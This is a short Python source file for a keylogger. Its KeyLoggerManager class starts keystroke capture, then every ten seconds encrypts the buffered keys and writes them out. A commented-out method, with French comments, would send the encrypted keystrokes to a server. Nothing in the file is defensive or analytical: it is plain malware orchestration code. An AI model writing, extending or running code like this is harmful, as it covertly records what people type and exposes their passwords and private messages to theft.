from KeyService import KeyLoggerService
from FileWriter import FileWriter
from Encryptor import Encryptor
import time

class KeyLoggerManager:
    def __init__(self, secret_key):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.encryptor = Encryptor(secret_key)

    def run(self):
        self.service.start_logging()
        try:
            while self.service.running:
                self.save_locally()
                time.sleep(10)
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"An error occurred: {e}")
            self.stop()

    def stop(self):
        self.service.stop_logging()
        self.save_locally()
        print("KeyLogger stopped.")

    def save_locally(self):
        try:
            logged_keys = "".join(self.service.buffer.get_data())
            encrypted_data = self.encryptor.encrypt(logged_keys)
            self.file_writer.send_data(encrypted_data, None)
            self.service.buffer.flush()
        except Exception as e:
            print(f"Failed to save data locally: {e}")

    # def send_to_server(self):
    #     """Envoie les données chiffrées au serveur."""
    #     logged_keys = "".join(self.service.buffer.get_data())
    #     encrypted_data = self.encryptor.encrypt(logged_keys)
    #     self.network_writer.send_data(encrypted_data, None)

if __name__ == "__main__":
    secret_key = "your_secure_secret_key"  # Remplacez par une clé sécurisée
    keyManager = KeyLoggerManager(secret_key)
    keyManager.run()
